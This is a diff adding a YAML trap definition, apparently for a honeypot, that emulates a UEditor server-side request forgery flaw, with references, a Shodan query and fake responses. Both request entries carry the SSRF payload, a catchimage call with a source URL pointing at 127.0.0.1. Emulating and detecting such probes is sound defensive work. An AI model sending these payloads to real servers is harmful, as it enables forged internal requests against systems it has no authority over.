@@ -1,0 +1,33 @@
+id: ueditor-ssrf
+info:
+  name: UEditor - Server Side Request Forgery
+  author: pwnhxl
+  description: UEditor contains an Server Side Request Forgery vulnerability.
+  severity: medium
+  reference:
+  - https://xz.aliyun.com/t/4154
+  - https://www.seebug.org/vuldb/ssvid-97311
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"UEditor"
+  tags: ueditor,ssrf
+traps:
+- request:
+    method: GET
+    path: /ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:/?1.png
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 链接不可用"original":"SUCCESS"
+- request:
+    method: GET
+    path: /ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:/?1.png
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
